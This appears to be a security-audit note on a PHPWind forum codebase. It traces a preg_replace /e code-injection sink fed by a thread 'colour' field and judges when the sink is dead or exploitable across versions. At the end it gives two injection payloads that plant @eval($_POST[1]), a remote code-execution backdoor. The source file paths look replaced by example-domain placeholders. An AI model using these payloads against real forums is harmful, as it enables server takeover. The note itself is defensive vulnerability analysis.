// require/target191.example.com:345 （htmread 内，帖子静态页生成路径）
$GLOBALS['foruminfo']['copyctrl'] && $read['content'] = preg_replace("/<br>/eis","copyctrl('$read[colour]')",$read['content']);

// lib/target192.example.com:409 （版块静态页生成路径，同一写法）
$this->forum->foruminfo['copyctrl'] && $read['content'] = preg_replace("/<br>/eis","copyctrl('$read[colour]')",$read['content']);

// 8.7 完全保留：require/target191.example.com:352、lib/target192.example.com:355
// 说明官方 8.7 未修此写法。

// 反证：pw_threads 建表语句（lang/install_wind.sql:3383-3423）逐列核对，无 colour 列：
// tid fid icon titlefont author authorid subject toolinfo toolfield ifcheck type
// postdate lastpost lastposter hits replies favors modelid shares topped topreplays
// locked digest special state ifupload ifmail ifmark ifshield anonymous dig fight
// ptable ifmagic ifhide inspect tpcstatus
// 全代码库 grep 'colour' 仅 3 处命中，全部是“读”，没有任何写入 pw_threads.colour 的代码
// → 7.5 SP3 / 8.7 上 $read['colour'] 恒为空，此 /e 为死代码。
// → 但 7.3.2 属更早版本，若老库 pw_threads 保留 colour 列且前台发帖曾支持“标题颜色”
//   （profile/post 模板里会有颜色选择器），则该 /e 立刻复活。

// 注入原理（若 colour 可控）：
//   colour = '){@eval($_POST[1])}//
//   替换串先被 PHP 双引号插值 → copyctrl('){@eval($_POST[1])}//')
//   再被 /e 当 PHP 代码 eval → 执行 { @eval($_POST[1]) }
// 另一个通用短 payload（不需要引号收尾，因为 colour 一般未做引号过滤）：
//   colour = a') , @eval($_POST[1]), ('b
//   插入后：copyctrl('a') , @eval($_POST[1]), ('b')  → 完整表达式，eval 执行